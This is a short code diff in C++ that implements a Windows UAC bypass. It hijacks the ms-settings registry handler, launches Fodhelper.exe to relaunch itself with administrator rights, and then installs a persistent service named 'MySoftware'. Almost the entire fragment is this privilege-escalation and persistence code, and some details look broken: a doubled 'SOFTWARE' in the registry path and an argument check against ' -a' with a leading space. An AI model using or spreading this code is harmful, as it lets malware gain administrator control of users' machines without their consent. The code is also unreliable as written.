@@ -1,0 +1,15 @@
+if (argc < 2)
+    {
+ 
+        string command = string(Filename) + " -a";
+        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", NULL, (char*)command.c_str(), command.length(), REG_SZ, true);
+        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", (char*)"DelegateExecute", (char*)"", 0, REG_SZ, true);
+        system("Fodhelper.exe");
+        return 0;
+    }
+    else if (string(argv[1]) == " -a")
+    {
+        cout << "Running as Admin!\n";
+        Privilege = "Elevated";
+        InstallService((char*)"MySoftware");
+    }
